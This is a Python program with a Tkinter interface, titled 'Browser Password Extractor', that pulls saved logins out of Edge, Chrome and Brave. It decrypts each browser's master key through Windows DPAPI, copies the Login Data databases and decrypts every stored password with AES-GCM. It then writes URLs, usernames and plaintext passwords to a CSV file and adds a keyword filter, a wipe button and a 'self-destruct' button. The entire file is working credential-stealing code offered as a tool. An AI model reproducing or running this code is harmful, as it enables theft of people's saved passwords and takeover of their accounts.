import os
import re
import json
import base64
import sqlite3
import win32crypt
import shutil
import csv
import time
import tkinter as tk
from tkinter import simpledialog, messagebox, scrolledtext, BooleanVar, StringVar
from tkinter.ttk import Progressbar
from Crypto.Cipher import AES

BROWSERS = {
    'Edge': {
        'LOCAL_STATE': os.path.expandvars(r"%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Local State"),
        'PATH': os.path.expandvars(r"%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data")
    },
    'Chrome': {
        'LOCAL_STATE': os.path.expandvars(r"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State"),
        'PATH': os.path.expandvars(r"%USERPROFILE%\AppData\Local\Google\Chrome\User Data")
    },
    'Brave': {
        'LOCAL_STATE': os.path.expandvars(r"%USERPROFILE%\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"),
        'PATH': os.path.expandvars(r"%USERPROFILE%\AppData\Local\BraveSoftware\Brave-Browser\User Data")
    }
}
extracted_passwords = []
last_activity_time = time.time()

def get_secret_key(browser):
    try:
        with open(BROWSERS[browser]['LOCAL_STATE'], "r", encoding='utf-8') as f:
            local_state = json.loads(f.read())
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
    except Exception:
        return None

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, iv)
        decrypted_pass = cipher.decrypt(encrypted_password)
        return decrypted_pass.decode()
    except Exception:
        return ""

def get_db_connection(browser_path, folder):
    db_path = os.path.join(browser_path, folder, "Login Data")
    if not os.path.exists(db_path):
        return None
    shutil.copy2(db_path, "Loginvault.db")
    return sqlite3.connect("Loginvault.db")

def extract_passwords():
    global extracted_passwords, last_activity_time
    extracted_passwords = []
    last_activity_time = time.time()
    try:
        log_area.delete('1.0', tk.END)
        csv_filename = 'decrypted_password.csv'
        total_estimate = sum(
            [len([f for f in os.listdir(paths['PATH']) if re.search(r"^Profile*|^Default$", f)])
             for _, paths in BROWSERS.items() if os.path.exists(paths['PATH'])]
        )
        done = 0
        progress['maximum'] = max(total_estimate, 1)

        with open(csv_filename, mode='w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            writer.writerow(["index", "browser", "url", "username", "password"])

            for browser, paths in BROWSERS.items():
                if not os.path.exists(paths['PATH']):
                    continue
                count = 0
                log_area.insert(tk.END, f"\n[INFO] Processing {browser}...\n")
                secret_key = get_secret_key(browser)
                if not secret_key:
                    log_area.insert(tk.END, f"[ERR] Could not get secret key for {browser}\n")
                    continue
                folders = [f for f in os.listdir(paths['PATH']) if re.search(r"^Profile*|^Default$", f)]

                for folder in folders:
                    conn = get_db_connection(paths['PATH'], folder)
                    if conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for index, login in enumerate(cursor.fetchall()):
                            url, username, ciphertext = login
                            if url and username and ciphertext:
                                password_decrypted = decrypt_password(ciphertext, secret_key)
                                extracted_passwords.append((index, browser, url, username, password_decrypted))
                                writer.writerow([index, browser, url, username, password_decrypted])
                                count += 1
                        cursor.close()
                        conn.close()
                        os.remove("Loginvault.db")
                    done += 1
                    progress['value'] = done
                    root.update_idletasks()
                log_area.insert(tk.END, f"[INFO] Extraction complete for {browser}: {count} passwords\n")

        update_display()
        messagebox.showinfo("Success", f"Passwords saved to '{csv_filename}'")
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {str(e)}")

def update_display(*args):
    global last_activity_time
    last_activity_time = time.time()
    filter_text = filter_var.get().lower()
    data = extracted_passwords.copy()
    if sort_option.get() == "url":
        data.sort(key=lambda x: x[2].lower())
    elif sort_option.get() == "username":
        data.sort(key=lambda x: x[3].lower())

    log_area.delete('1.0', tk.END)
    log_area.insert(tk.END, "[INFO] Displaying extracted passwords:\n\n")

    line_index = 2.0
    for (index, browser, url, username, decrypted_password) in data:
        display_password = decrypted_password if show_passwords.get() else "******"
        line = f"[{index}] {browser} | {url} | {username} | {display_password}\n"
        if filter_text in url.lower() or filter_text in username.lower() or filter_text == "":
            log_area.insert(tk.END, line)
            if filter_text:
                idx = line.lower().find(filter_text)
                while idx != -1:
                    start_idx = f"{line_index}+{idx}c"
                    end_idx = f"{start_idx}+{len(filter_text)}c"
                    log_area.tag_add("highlight", start_idx, end_idx)
                    idx = line.lower().find(filter_text, idx + len(filter_text))
            line_index += 1.0

def secure_wipe():
    global extracted_passwords
    for i in range(len(extracted_passwords)):
        extracted_passwords[i] = ("", "", "", "", "")
    extracted_passwords.clear()
    update_display()

def auto_timeout_check():
    if time.time() - last_activity_time > 300:
        secure_wipe()
    root.after(10000, auto_timeout_check)

def ask_master_password():
    while True:
        password = simpledialog.askstring("Master Password", "Enter master password to launch:", show='*', parent=root)
        if password == "123":
            break
        else:
            messagebox.showerror("Access Denied", "Incorrect master password. Try again.")

root = tk.Tk()
root.title("Browser Password Extractor (Edge, Chrome, Brave)")
root.geometry("1000x700")
root.configure(bg="#717171")

show_passwords = BooleanVar(value=True)
filter_var = StringVar()
sort_option = StringVar(value="url")

tk.Label(root, text="Browser Password Extractor", font=("Arial",16), bg="#1e1e1e", fg="white").pack(pady=10)
tk.Entry(root, textvariable=filter_var, width=50, bg="white", fg="black").pack()
tk.Label(root, text="Enter keyword to filter & highlight (e.g. facebook)", bg="#1e1e1e", fg="white").pack(pady=5)

frame_sort = tk.Frame(root, bg="#605e5e")
frame_sort.pack()
tk.Radiobutton(frame_sort, text="Sort by URL", variable=sort_option, value="url", bg="#1e1e1e", fg="white", selectcolor="#1e1e1e").pack(side=tk.LEFT, padx=5)
tk.Radiobutton(frame_sort, text="Sort by Username", variable=sort_option, value="username", bg="#1e1e1e", fg="white", selectcolor="#1e1e1e").pack(side=tk.LEFT, padx=5)

progress = Progressbar(root, orient='horizontal', length=400, mode='determinate')
progress.pack(pady=5)

log_area = scrolledtext.ScrolledText(root, width=110, height=25, bg="#121212", fg="white", insertbackground="white", wrap="none")
log_area.pack(pady=10, fill=tk.BOTH, expand=True)
log_area.tag_configure("highlight", background="yellow", foreground="red")

tk.Checkbutton(root, text="Show Decrypted Passwords", variable=show_passwords, command=update_display, bg="#1e1e1e", fg="white", indicatoron=1, selectcolor="green").pack()
tk.Button(root, text="Extract and Save Passwords", command=extract_passwords, bg="#333", fg="white").pack(pady=5)
tk.Button(root, text="Clear All Extracted Data", command=secure_wipe, bg="#333", fg="white").pack()
tk.Button(root, text="Self-Destruct & Close", command=lambda: (secure_wipe(), root.destroy()), bg="#333", fg="white").pack(pady=5)

filter_var.trace_add('write', update_display)
sort_option.trace_add('write', update_display)

ask_master_password()
auto_timeout_check()
root.mainloop()
